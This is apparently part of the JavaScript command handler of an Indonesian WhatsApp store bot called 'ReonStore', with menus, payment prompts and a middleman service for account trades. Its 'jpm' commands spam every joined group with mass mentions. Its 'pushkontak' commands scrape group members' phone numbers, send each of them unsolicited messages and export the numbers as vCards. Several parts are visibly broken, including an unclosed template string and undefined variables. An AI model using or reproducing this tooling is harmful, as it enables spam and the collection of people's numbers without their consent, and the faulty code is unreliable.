Status : ${isZeroone ? 'Premium' : 'Free'}

┌─> 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨
│➮ ${prefix}ᴅᴏɴᴀsɪ
│➮ ${prefix}ᴏᴡɴᴇʀ
│➮ ${prefix}sᴄʀɪᴘᴛ
│➮ ${prefix}sᴛɪᴄᴋᴇʀ *gambar*
│➮ ${prefix}ғᴇᴇᴀᴅᴍɪɴ/ᴍᴄ
│➮ ${prefix}ǫᴄ *teks*
│➮ ${prefix}ᴘᴀʏᴍᴇɴᴛ
│➮ ${prefix}ᴛᴀᴛᴀᴄᴀʀᴀᴍᴄ
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ1
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ2
│➮ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ3
│➮ ${prefix}ғᴏʀᴍᴀᴛɴᴇᴇᴅ
└──────────>
`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'ownermenu': {
m.reply(`Hay Kak ${pushname} 👋 
Selamat ${salam}
Status : ${isZeroone ? 'Premium' : 'Free'}

┌─> 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡U
│➮ ${prefix}ᴄᴇᴋɢᴄ
│➮ ${prefix}ᴘᴜʙʟɪᴄ
│➮ ${prefix}sᴇʟғ
│➮ ${prefix}ɪᴅɢʀᴏᴜᴘ
│➮ ${prefix}ᴀɴᴛɪʟɪɴᴋ
│➮ ${prefix}ᴋɪᴄᴋ *tag/reply*
│➮ ${prefix}ᴊᴏɪɴ *linkgroup*
│➮ ${prefix}ᴊᴘᴍ *teks*
│➮ ${prefix}ᴀᴅᴅᴍᴇᴍ *628xx*
│➮ ${prefix}ᴊᴘᴍɪᴍᴀɢᴇ *teks|jeda*
│➮ ${prefix}ᴀᴜᴛᴏᴊᴘᴍ *on/off*
│➮ ${prefix}ᴘʀᴏᴍᴏᴛᴇ *tag/reply*
│➮ ${prefix}ᴅᴇᴍᴏᴛᴇ *tag/reply*
│➮ ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
│➮ ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
│➮ ${prefix}ᴇᴅɪᴛɴᴀᴍᴀɢᴄ
│➮ ${prefix}ᴇᴅɪᴛᴅᴇᴋs
│➮ ${prefix}ᴛᴀɢᴀʟ *teks*
│➮ ${prefix}ʜɪᴅᴇᴛᴀɢᴇ *teks*
│➮ ${prefix}ᴘᴜsʜᴍᴇᴍʙᴇʀ *teks*
│➮ ${prefix}ᴅᴏɴᴇᴛʀx *barang,nominal,tanggal*
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴀᴄᴛ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1 *idgroup*
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ *id|text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄ *text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅᴊᴅ *id|jeda|textT*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄᴊᴅ *jeda|text*
└──────────>
`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'pushkontakmenu': {
m.reply(`Hay Kak ${pushname} 👋 
Selamat ${salam}
Status : ${isZeroone ? 'Premium' : 'Free'}

┌─> 𝗣𝗨𝗦𝗛𝗞𝗢𝗡𝗧𝗔𝗞
│➮ ${prefix}ɪᴅɢʀᴏᴜᴘ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴀᴄᴛ
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1 *idgroup*
│➮ ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ *id|text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄ *text*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅᴊᴅ *id|jeda|textT*
│➮ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɢᴄᴊᴅ *jeda|text*
└──────────>
`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'autojpm': {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
if (!m.isGroup) return reply('khusus grup') 
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (Jpm) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan jpm di group ini ⚡')
} else if (args[0] === "off") {
if (!Jpm) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan jpm di group ini ⚡')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "jpm":{
if (!isZeroone) return reply(`Khusus Owner`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await ReonStore.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ReonStore.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ReonStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ReonStore.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0]})
await sleep(text.split('|')[1])
} else {
await ReonStore.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL✅*")
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "jpmtag":{
if (!isZeroone) return reply(`Khusus Owner`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan ✅_")
let getGroups = await ReonStore.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ReonStore.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ReonStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ReonStore.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await ReonStore.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL✅*")
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//   
case "tatacaramc": {
m.reply(`*𝘾𝘼𝙍𝘼 𝙋𝘼𝙆𝘼𝙄 𝘼𝘿𝙈𝙄𝙉 / 𝙈𝘾 𝘽𝙔 𝙍𝙀𝙊𝙉* 

- 𝙱𝚄𝚈𝚈𝙴𝚁 𝚃𝙵 𝙺𝙴 𝙰𝙳𝙼𝙸𝙽 + 𝙵𝙴𝙴  ( 𝚂𝙴𝚂𝚄𝙰𝙸 𝙺𝙴𝚃𝙴𝙽𝚃𝚄𝙰𝙽 ) 
- 𝚂𝙴𝚂𝚄𝙳𝙰𝙷 𝚃𝙵 𝚂𝚂 ( 𝚂𝙴𝙱𝙰𝙶𝙰𝙸 𝙱𝚄𝙺𝚃𝙸 )
- 𝚂𝙴𝚃𝙴𝙻𝙰𝙷 𝙱𝚄𝚈𝚈𝙴𝚁 𝚃𝙵 ( 𝚂𝚂 )  𝙺𝙴 𝙰𝙳𝙼𝙸𝙽, 𝙳𝙰𝙽 𝙰𝙳𝙼𝙸𝙽 𝙼𝙴𝙽𝙶𝙰𝚃𝙰𝙺𝙰𝙽 " 𝙼𝙰𝚂𝚄𝙺" 𝙼𝙰𝙺𝙰 𝚂𝙴𝙻𝙻𝙴𝚁 𝚂𝙴𝙽𝙳 𝙳𝙰𝚃𝙰 𝙺𝙴 𝙱𝚄𝚈𝚈𝙴𝚁 ( 𝙳𝙸 𝙲𝙰𝚃 𝙿𝚁𝙸𝙱𝙰𝙳𝙸 )
- 𝚂𝙴𝚃𝙴𝙻𝙰𝙷 𝚂𝙴𝙽𝙳 𝙰𝙺𝚄𝙽 𝙱𝚄𝚈𝚈𝙴𝚁 "𝙼𝙴𝙽𝙶𝙰𝙼𝙰𝙽𝙺𝙰𝙽 𝙳𝙰𝚃𝙰𝙽𝙶𝙰( 𝙳𝙸 𝙶𝙰𝙽𝚃𝙸 𝙰𝙻𝙻 𝙳𝙰𝚃𝙰 )
- 𝚂𝙴𝚃𝙴𝙻𝙰𝙷 𝙼𝙴𝙽𝙶𝙰𝙼𝙰𝙽𝙺𝙰𝙽 "𝚆𝙰𝙹𝙸𝙱" 𝚄𝙽𝚃𝚄𝙺 𝚂𝙴𝙻𝙻𝙴𝚁 𝙰𝙻𝙻 𝚁𝙴𝙲
- 𝚂𝙴𝚃𝙴𝙻𝙰𝙷 𝙰𝙻𝙻 𝚁𝙴𝙲, 𝙱𝚄𝚈𝚈𝙴𝚁 𝙼𝙴𝙽𝙶𝙰𝚃𝙰𝙺𝙰𝙽 "𝙳𝙾𝙽𝙴" 𝙺𝙴𝚃𝙸𝙺𝙰 𝙰𝙺𝚄𝙽 𝚂𝚄𝙳𝙰𝙷 𝙳𝙸 𝙰𝙼𝙰𝙽𝙺𝙰𝙽 𝙻𝙰𝙻𝚄 𝚂𝚂 𝙻𝙾𝙱𝚈

NOTE:
SELALU MEMAKAI ADMIN REON*, AGAR TERHINDAR DARI KATA *SCAM* 

*TETAP BERHATI-HATI DALAM MEMILIH ADMIN !!*
`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "feemc":
case "feeadmin": {
if (!isZeroone) return m.reply('*Lu Bukan Owner Gua, Gak Usah Sok asik Tolol*')
const text12 = `FEE BER² ${namaCreator}

• 0 - 99K = 5k
• 100K - 199K = 10k
• 200K - 299K = 15K
• 300K - 399K = 20K
• 400K - 499K = 25K
• 500K - 599K = 30K
• 600K - 699K = 35K
• 700K - 799K = 40K
• 800K - 899K = 45K
• 900K - 999K = 50K
• 1JT - 1,4JT = 55K
• 1,5JT - 2,5JT = 60K
reply(text12)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "formatpencairan": {
if (!isZeroone) return m.reply('*Lu Bukan Owner Gua, Gak Usah Sok asik Tolol*')
const text12 = `FORMAT PENCAIRAN ${namaCreator}

Pencarian : 
No pay    : 
Atas nama :

KESALAHAN PADA NOMOR PENCAIRAN BUKAN JADI TANGGUNG JAWAB KAMI TOLONG DI CEK DENGAN DETAIL DAN SEBENAR-BENARNYA AGAR TIDAK TERJADI KESALAHAN YANG TIDAK DI INGINKAN KESALAHAN PADA NOMOR PENCAIRAN KAMI TIDAK AKAN BERTANGGUNG JAWAB`
reply(text12)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "allrec": {
if (!isZeroone) return m.reply('*Lu Bukan Owner Gua, Gak Usah Sok asik Tolol*')
const text12 = `REKAM LAYAR!

> HAPUS SEMUA PESAN GMAIL
> KOSONGKAN SEMUA SAMPAH GMAIL
> HAPUS AKUN FB DARI PERANGKAT
> LOGOUT FF

*BY* ${namaCreator}`
reply(text12)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "danamasuk": {
if (!isZeroone) return m.reply('*Lu Bukan Owner Gua, Gak Usah Sok asik Tolol*')
const text12 = `DANA MASUK!

SILAHKAN SEND DATA SECARA PRIBADI KALO SUDAH DONE DAN DATA SUDAH DI AMANKAN SILAHKAN KETIK DONE KE GRUP BESERTA BUKTI SS LOGIN AKUN AGAR DANA BISA DI CAIRKAN KE PENJUAL UNTUK PENJUAL SILAHKAN KETIK .formatpencairan LALU ISI DENGAN BENAR AGAR KAMI TIDAK SALAH MENCAIRKAN DANA KESALAHAN DI TANGGUNG PENJUAL

X TRX BATAL FEE TETEP KEPOTONG X
BE SMART BUYER AND SELLER`
reply(text12)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await ReonStore.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ReonStore.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'tourl': {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
await loading()
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./all/lib/uploader')
let media = await ReonStore.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
        case 'donetrx':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,tanggal`);
let barang = t[0];
let nominal = t[1];
let tanggal = t[2];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *👜Barang:* ${barang}_
 _• *💰Nominal:* Rp${nominal}_
 _• *📅Tanggal:* ${tanggal}_
 _• *⏰Waktu:* ${time}_
 _• *🔈︎︎Status:* Done_

*TERIMA KASIH TELAH ORDER DI ${global.ownername}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
        case 'formatpost3':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} mc,log,item,spek,ident,harga,nowa\n\n*_Kalo Tidak Ada_ -*`);
let mc = t[0];
let log = t[1];
let item = t[2];
let spek = t[3];
let harga = t[4];
let nowa = t[5];
let ident = t[6];
reply(`*FORMAT JASA POST REON !*  
( BUKAN MILIK ADMIN )

︎︎MC : *${mc}*
LOG : *${log}*
ITEM : *${item}*
SPEK : *${spek}*
IDENT : *${ident}*
HARGA : *${harga}*
NO WA : *${nowa}*

✅ TAWAR MENAWAR LANGSUNG HUBUNGI KONTAK DI ATAS !
✅ WAJIB MENGGUNAKAN JASA ADMIN *REON* SUPAYA TERHINDAR DARI PENIPUAN  !
✅ BE SMART BUYYER`)
}
        break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
        case 'add': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ReonStore.groupParticipantsUpdate(from, [users], 'add')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'antilink': {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//=================================================
case 'owner': case 'creator':{
 ReonStore.sendContact(from, global.owner, m)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "script": case"sc":{
notag = `${owner}@s.whatsapp.net`
ReonStore.sendMessage(from, { text: `Minta Ke @${notag.split("@")[0]}`, mentions: [notag] }, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "formatpost1": {
m.reply(`*FORMAT JASA POST REON !*  
( BUKAN MILIK ADMIN )

MC :
LOG :
ITEM : 
SPEK : 
IDENT :
HARGA : 
NO WA : 

✅ TAWAR MENAWAR LANGSUNG HUBUNGI KONTAK DI ATAS !
✅ WAJIB MENGGUNAKAN JASA ADMIN *REON* SUPAYA TERHINDAR DARI PENIPUAN  !
✅ BE SMART BUYYER`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'paymentmenu': case 'pay': case 'payment': {
                ReonStore.sendMessage(m.chat, { image: { url: '' }, caption: `*Hi Bro ${m.pushName}*\n*_Jika ingin Trx Silahkan Scan Gambar Diatas_*

*• DANA :* ${dana}
*• OVO :* ${ovo}
*• GOPAY :* ${gopay}
*• SHOPEEPAY :* ${shopeepay}
*• QRIS :* PM

*SEMUA PEMBAYARAN*
*WAJIB MENYERTAKAN BUKTI TRANSFER !!*
*( ALL TRX NO REFF‼️ )*` }, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'donasi': case 'donate': case 'donasi': case 'donasi': {
                ReonStore.sendMessage(m.chat, { image: { url: '' }, caption: `*Hi Bro ${m.pushName}*\n*_Jika ingin Donasi Silahkan Scan Gambar Diatas_*

*• DANA :* ${dana}
*• OVO :* ${ovo}
*• GOPAY :* ${gopay}
*• SHOPEEPAY :* ${shopeepay}
*• QRIS :* PM
*• Saweria :* https://saweria.co/Reon15

*_Terima Kasih Bagi Yang Sudah Donasi_*\n` }, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case  'qc':{
if (!isZeroone) return m.reply(`*Khusus Owner*`)

let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await ReonStore.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await ReonStore.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await ReonStore.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'public': {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
ReonStore.public = true
m.reply('Sukse Change To Public')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'self': {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
ReonStore.public = false
m.reply('Sukses Change To Self')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "join": {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
if (!text) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ReonStore.groupAcceptInvite(result).then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
        case "pushkontakid":{
if (!isZeroone) return reply(`Khusus Owner`)
if (isGroup) return reply("khusus Private")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("Otw Boskuuu")
const groupMetadataa = !isGroup? await ReonStore.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ReonStore.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await ZeroOfficial.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await ZeroOfficial.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA [${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ReonStore.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
//=================================================//
case "pushkontakgc":{
if (!isZeroone) return reply(`Khusus Owner  Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("_Tᴜɴɢɢᴜ ᴋᴀᴋ ʟᴀɢɪ ᴘʀᴏsᴇs !!_")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
await reply("_Tᴜɴɢɢᴜ ᴋᴀᴋ ʟᴀɢɪ ᴘʀᴏsᴇs !!_")
global.tekspushkonv2 = text
const groupMetadata = isGroup? await ReonStore.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ReonStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ReonStore.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await ReonStore.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA [${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ReonStore.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
//=================================================//
    case 'save': {
if (!isZeroone) return reply("khusus owner dek")
let t = text.split('|');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} .nama pake titik sebelum nama yah`);
let nama = t[0];
let nominal = t[1];
        reply(mess.save)
reply(`𝕊𝕐𝕊𝕋𝔼𝕄 𝕊𝔸𝕍𝔼 𝕆𝕋𝕆𝕄𝔸𝕋𝕀𝕊 𝔻𝕆ℕ𝔼✅

𝕂𝕆ℕ𝕋𝔸𝕂 : ${nominal}

𝕁𝔸ℕ𝔾𝔸ℕ 𝕃𝕌ℙ𝔸 𝕊𝔸𝕍𝔼 𝔹𝔸ℂ𝕂 ${namabot} 𝕐𝕆𝕆`)
}
        break
//=================================================//        
case "pushkontakidjd":
if (!isZeroone) return reply(`Khusus Owner`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("_Tᴜɴɢɢᴜ ᴋᴀᴋ ʟᴀɢɪ ᴘʀᴏsᴇs !!_")
const groupMetadataa = !isGroup? await ReonStore.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await ReonStore.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await ReonStore.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await ReonStore.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes BANG!")
break
//=================================================//
